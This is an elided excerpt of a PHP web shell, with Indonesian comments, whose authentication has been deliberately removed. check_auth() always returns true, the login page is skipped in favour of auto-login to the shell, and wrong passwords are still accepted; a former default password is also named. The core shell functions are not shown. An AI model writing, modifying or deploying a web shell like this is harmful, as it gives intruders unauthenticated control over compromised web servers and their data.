...
/*
    ...
    Version: 1.0 (NO PASSWORD - ALL FEATURES INTACT)
*/
...
// Default password: "xi_sem_bugbounty" (TIDAK DIGUNAKAN LAGI)
...
// Rate limiting (dipertahankan tapi tidak digunakan untuk login)
...
// ============================================================
// 🔓 AUTHENTICATION SYSTEM - PASSWORD REMOVED
// ============================================================

function check_auth() {
    // 🔓 PASSWORD DISABLED - Always return true
    // Semua fitur tetap berjalan, hanya proteksi login yang dihapus
    return true;
}

function login_shell($error = '') {
    // 🔓 AUTO-LOGIN - Langsung akses shell, tidak tampilkan halaman login
...
// 🔓 AUTO-LOGIN - Set session agar fitur berjalan normal
$_SESSION['authenticated'] = true;
$_SESSION['login_time'] = time();

// Handle login (dipertahankan untuk kompatibilitas, tapi tidak digunakan)
if (isset($_POST['pass'])) {
    // Login via POST tetap bisa, tapi tidak wajib
    ...
    if (md5($_POST['pass']) === $auth_pass) {
        ...
        // Tetap lanjutkan meskipun password salah (karena auth sudah bypass)
        $_SESSION['authenticated'] = true;
        $_SESSION['login_time'] = time();
    }
}
...
// ============================================================
// 📁 CORE FUNCTIONALITY - TIDAK BERUBAH
// ============================================================
